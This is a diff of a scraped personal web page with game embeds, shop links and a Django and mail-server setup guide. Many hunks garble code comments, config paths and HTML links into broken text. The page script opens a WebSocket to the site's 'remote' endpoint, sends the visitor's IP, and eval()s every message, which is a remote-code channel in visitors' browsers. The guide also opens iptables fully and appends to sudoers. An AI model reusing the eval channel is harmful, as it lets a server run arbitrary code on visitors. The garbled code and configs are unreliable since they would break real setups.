@@ -139,14 +139,19 @@
 
 
 
-<div id="0" style="white-space: pre-wrap;">Three Thirteen - Online Card Game
-Play Three Thirteen with a friend by clicking the link below to generate an invite code or join a game.
-<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">Invite with code</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Join game</a>
-<script src="/static/games/threethirteen.js"></script>
-***</div>
+<div id="0" style="white-space: pre-wrap;">
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="Buy on"/><p>by Daisy / <a href="/en/three-thirteen---online-card" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
+
+
+
+Three Thirteen - Online Card Game
+Play Three Thirteen with a friend by clicking the link below to generate an invite code or join a game.
+<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">Invite with code</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>" title="Join a game"&gt;Join game
+<script src="/static/games/threethirteen.js"></script>
+</div>
+
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="Buy on"/><p>by Daisy / <a href="/en/three-thirteen---online-card" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -166,6 +171,26 @@ Play Three Thirteen with a friend by clicking the link below to generate an invi
 <hr></div>
 
 <div id="1" style="white-space: pre-wrap;">
+
+
+
+
+Play Color Sudoku Online - Free Colordoku Game
+This is a free to play Color Sudoku (Colordoku) game.
+
+
+
+
+<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>by Daisy / <a href="/en/play-color-sudoku-online---free" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">
 
 
 
@@ -1058,7 +1083,7 @@ Next, we will examine the view to register a user, now that we have a form and a
 
 
 <pre class="language-python"><code>
-#  … imports
+# … Amounts
 from .forms import UserRegisterForm
 
 def register(request):
@@ -1635,7 +1660,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# Sendwelcomeemail (request, user)
+#         sendwelcomeemail(request, user)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -2069,7 +2094,7 @@ Next, let's improvise our login view to redirect to a secondary authentication v
 
 
 <pre class="language-python"><code>
-# … Amounts
+#  … imports
 
 def login(request):
     if request.method == “POST”:
@@ -3002,7 +3027,7 @@ def mfa(request, username, usertoken):
             is_verified = check_verification_code(user, token, code) #  Check the code
             p.mfa_authenticated = is_verified
             if token_validated: #  If everything
-                if is_verified: # Is in order
+                if is_verified: #  Is in order
                     user.profile.mfa_enabled = True #  Enable MFA (if not already enabled)
                     user.profile.save()
                     auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') #  Log in the user
@@ -3184,7 +3209,7 @@ Note that this is a lot of jinja, you may not have all of these variables define
       &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
       &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
       {% endif %}
-      &lt;small&gt;# {{ user.id }}&lt;/small&gt;
+      &lt;small&gt;# {{User.id}} &lt;/Small&gt;
       &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
     &lt;/div&gt;
     {%if not user.is_superuser %}
@@ -3475,7 +3500,7 @@ PrintMotd no
 # Clientalive interval 0
 # ClientAliveCountMax 3
 # Usedns in
-# Pidfile /hrun/sshd.pid
+# Pidfile /run/sshd.pid
 # MaxStartups 10:30:100
 # PEMITTUNL NO
 # ChrootDirectory none
@@ -3694,7 +3719,7 @@ sudo service rsyslog restart
 # Nano config
 echo "set tabsize 4" &gt;&gt; .nanorc
 echo "set tabstospaces" &gt;&gt; .nanorc
-# Git config
+#  Git config
 echo "Git configuration"
 sudo git config --global user.email "jasper.camber.holton@gmail.com" &amp;&amp; sudo git config --global user.name "Jasper Holton"
 git config --global user.email "jasper.camber.holton@gmail.com"
@@ -3718,7 +3743,7 @@ echo "-a exit,always -F arch=b32 -F euid=0 -S execve" | sudo tee -a /etc/audit/a
 echo "Starting antivirus"
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
-#  Set hostname
+# Set hostname
 echo "127.0.0.1 femmebabe" | sudo tee -a /etc/hosts
 sudo hostnamectl set-hostname localhost
 # Setup postgres
@@ -3747,7 +3772,7 @@ sudo ufw allow 'Dovecot Secure POP3'
 sudo ufw allow 110/tcp
 sudo ufw allow 25/tcp
 echo "y" | sudo ufw enable
-# Disable IPTables
+# Disabled iPatables
 echo "Configuring firewall"
 sudo iptables -P INPUT ACCEPT
 sudo iptables -P OUTPUT ACCEPT
@@ -3953,7 +3978,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 #  Inject pam config and remove faulty ssh config
-# SUDO SED -I '' -and $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # SUDO SED -I '' -and $ d ' /etc /profile
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -3992,7 +4017,7 @@ sudo systemctl start daphne.service
 sudo systemctl start celery.service
 sudo systemctl start celerybeat.service
 sudo systemctl start clamav-daemon
-# Enable Apache Modules
+#  Enable apache modules
 echo "Enabling apache2"
 sudo a2enmod rewrite
 sudo a2enmod wsgi
@@ -4004,7 +4029,7 @@ sudo a2enmod proxy_http
 sudo a2enmod proxy_wstunnel
 # sudo a2dismod mpm_event
 # sudo a2dismod mpm_worker
-# sudo a2enmod mpm_prefork
+# sudo a2enMod MPM_PreFork
 # Disable Default Site
 sudo a2dissite 000-default
 sudo a2dissite 000-default-le-ssl
@@ -4134,7 +4159,7 @@ echo "postfix postfix/mailname string femmebabe.com" | sudo debconf-set-selectio
 echo "postfix postfix/main_mailer_type string 'Internet Site'" | sudo debconf-set-selections
 sudo NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt install -y postfix
 sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg libapache2-mod-wsgi-py3 apache2 cmake python-is-python3 python3-venv python3-pip python3-django expect tesseract-ocr openjdk-8-jdk redis-server libopencv-dev python3-opencv python3-dev libsasl2-dev opendkim opendkim-tools dovecot-core dovecot-pop3d dovecot-imapd auditd procmail libpq-dev postgresql postgresql-contrib libheif-dev snapd git software-properties-common certbot python3-certbot-apache
-# Enable Clamav antivirus
+# Enable Clamav Antivirus
 echo "Starting antivirus"
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
@@ -4179,7 +4204,7 @@ sudo ln -s /snap/bin/certbot /usr/bin/certbot
 sudo snap install redis
 sudo systemctl enable apache2
 sudo systemctl start apache2
-#  Run certbot
+# Run Certbot
 sudo certbot --apache --non-interactive --agree-tos --domains femmebabe.com --email &lt;youremail&gt;@gmail.com
 # Set User Settings
 sudo gpasswd -a www-data users
@@ -4639,7 +4664,7 @@ recipient_delimiter = +
 inet_interfaces = all
 inet_protocols = all
 
-# Milter configuration
+#  Milter configuration
 milter_default_action = accept
 milter_protocol = 6
 smtpd_milters = local:/opendkim/opendkim.sock
@@ -4685,13 +4710,13 @@ Add these lines:
 # 
 #  ==========================================================================
 #  service type  private unpriv  chroot  wakeup  maxproc command + args
-# (YES) (YES) (No) (Never) (100)
+#                (yes)   (yes)   (no)    (never) (100)
 #  ==========================================================================
 smtp      inet  n       -       y       -       -       smtpd
 # smtp      inet  n       -       y       -       1       postscreen
 # SMTPD Pass - - Y - - SMTPD
 # DNSBLOG UNIX - - Y - 0 DNSBLOG
-# TLSPROXY UNIX - - Y - 0 TLSPROXY
+# tlsproxy  unix  -       -       y       -       0       tlsproxy
 #  Choose one: enable submission for loopback clients only, or for any client.
 # 127.0.0.1:submission inet n -   y       -       -       smtpd
 submission inet n       -       y       -       -       smtpd
@@ -4724,7 +4749,7 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrictions
 #   -o smtpd_helo_restrictions=$mua_helo_restrictions
 #   -o smtpd_sender_restrictions=$mua_sender_restrictions
-#   -o smtpd_recipient_restrictions=
+# -o smtpd_recipient_trastrictions =
 #   -o smtpd_relay_restrictions=permit_sasl_authenticated,reject
 # -O MILTER_MACRO_DAEmon_Name = Originating
 # 628 Inet N - Y - - QMQPD
@@ -4780,7 +4805,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # 
 #  Specify in main.cf one or more of the following:
 #   mailbox_transport = lmtp:inet:localhost
-# Virtual_Transport = LMTP: INET: LocalHost
+#   virtual_transport = lmtp:inet:localhost
 # 
 #  ====================================================================
 # 
@@ -4794,7 +4819,7 @@ maildrop  unix  -       n       n       -       -       pipe
 #  Old example of delivery via Cyrus.
 # 
 # Old -Cyrus Unix - N N - - Pipe
-#   flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
+# Flags = R User = Cyrus Argv =/Cyrus/Bin/Deliver -e -m $ {extension} $ {User}
 # 
 #  ====================================================================
 # 
@@ -4851,7 +4876,7 @@ Add these lines:
 # Daemon_opts = ""
 #  Change to /var/spool/postfix/run/opendkim to use a Unix socket with
 #  postfix in a chroot:
-# Rundir =/was/spool/postfix/Run/Opendkim
+# Roundir =/VAR/Spool/Postfix/Run/Opendkim
 RUNDIR=/run/opendkim
 # 
 #  Uncomment to specify an alternate socket
@@ -4954,7 +4979,7 @@ service lmtp {
 
 service imap {
   #  Most of the memory goes to mmap()ing files. You may need to increase this
-  # Limit if you have huge mailboxes.
+  #  limit if you have huge mailboxes.
   # VSZ_LIMI = $ Default_vsz_Limit
 
   #  Max. number of IMAP processes (connections)
@@ -4963,12 +4988,12 @@ service imap {
 
 service pop3 {
   #  Max. number of POP3 processes (connections)
-  # Process_limit = 1024
+  # process_limit = 1024
 }
 
 service submission {
   #  Max. number of SMTP Submission processes (connections)
-  # process_limit = 1024
+  # Process_limit = 1024
 }
 
 service auth {
@@ -4996,7 +5021,7 @@ service auth-worker {
   #  Auth worker process is run as root by default, so that it can access
   #  /etc/shadow. If this isn't necessary, the user should be changed to
   # $ default_interal_user.
-  # User = root
+  # user = root
 }
 
 service dict {
@@ -5033,7 +5058,7 @@ And add these lines
 
 
 <pre class="language-bash"><code>
-## Ovecot Configuration file
+##  Dovecot configuration file
 
 #  If you're in a hurry, see http://wiki2.dovecot.org/QuickConfiguration
 
@@ -5123,7 +5148,7 @@ And add these lines
 # "Proxy :: &lt;Name&gt;".
 
 dict {
-  # quota = MySQL: /etc/dovecot/dovecot-dict-sql.conf.ext
+  # quota = MySQL:/andc/dovecot/dovecot-dic-sql.conf.ext
 }
 
 #  Most of the actual configuration gets included below. The filenames are
@@ -5222,7 +5247,7 @@ OversignHeaders		From
 #  setup options can be found in /usr/share/doc/opendkim/README.opendkim.
 # Domain Example.com
 # Selector		2020
-# KeyFile		/etc/dkimkeys/example.private
+# Keyfile /etc/dkimkeys/example.private
 
 #  In Debian, opendkim runs as user "opendkim". A umask of 007 is required when
 #  using a local socket with MTAs that access the socket as a non-privileged
@@ -5235,7 +5260,7 @@ UMask			007
 #  it must be ensured that the socket is accessible. In Debian, Postfix runs in
 #  a chroot in /var/spool/postfix, therefore a Unix socket would have to be
 #  configured as shown on the last line below.
-# Socket			local:/run/opendkim/opendkim.sock
+# Socket Local: /run/opendkim/opendkim.sock
 # Socket inet: 8891@Localhost
 # Socket inet: 8891
 Socket			local:/var/spool/postfix/opendkim/opendkim.sock
@@ -5249,7 +5274,7 @@ PidFile			/run/opendkim/opendkim.pid
 #  The trust anchor enables DNSSEC. In Debian, the trust anchor file is provided
 #  by the package dns-root-data.
 TrustAnchorFile		/usr/share/dns/root.key
-# Nameservers		127.0.0.1
+# Nameservers 127.0.0.1
 
 #  Map domains in From addresses to keys used to sign messages
 KeyTable           refile:/etc/opendkim/key.table
@@ -5616,25 +5641,20 @@ Thank you for taking the time to read this third edition web development guide. 
 <div><p>by Daisy / <a href="/en/practical-web-based-deep" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">Two Player Color Sudoku Online Free
+<div id="3" style="white-space: pre-wrap;">
+
+
+
+
+Two Player Color Sudoku Online Free
 Play collaborative color Sudoku with a friend for free.
 <a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">Invite a friend</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Join a game</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="Buy on"/><p>by Daisy / <a href="/en/two-player-color-sudoku-online" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">Play Color Sudoku Online - Free Colordoku Game
-This is a free to play Color Sudoku (Colordoku) game.
-***
-<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>by Daisy / <a href="/en/play-color-sudoku-online---free" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="Buy on"/><p>by Daisy / <a href="/en/two-player-color-sudoku-online" title="View post">View</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with cryptocurrency</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>How do i wear deadlock?</p><p><br/></p><p>1. Start by growing your hair out to the desired length. Your hair should be at least 2-3 inches long for the best results.</p><p><br/></p><p>2. Section your hair into small, even parts using a comb. The size of the sections will determine the size of your dreadlocks, so make sure to choose a size that you are comfortable with.</p><p><br/></p><p>3. Begin backcombing each section of hair by twisting and pulling it tightly towards the roots. This will create knots in the hair, which will eventually form into dreadlocks.</p><p><br/></p><p>4. Apply wax or gel to each section of hair to help hold the knots in place and encourage the hair to mat together.</p><p><br/></p><p>5. Continue backcombing and twisting each section of hair until you have completed your entire head. This process can be time-consuming, so be patient and take breaks as needed.</p><p><br/></p><p>6. Once all of your hair has been twisted and backcombed, let it sit for a few days to allow the knots to tighten and form into dreadlocks.</p><p><br/></p><p>7. After a few days, you can start to style and maintain your dreadlocks by washing them with residue-free shampoo and using a crochet hook to help tighten any loose knots.</p><p><br/></p><p>8. To keep your dreadlocks looking neat and tidy, consider using a scarf or bandana to cover them when sleeping or in dirty environments. Regular maintenance and upkeep will help your dreadlocks stay healthy and vibrant.</p></div>
@@ -5931,32 +5951,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
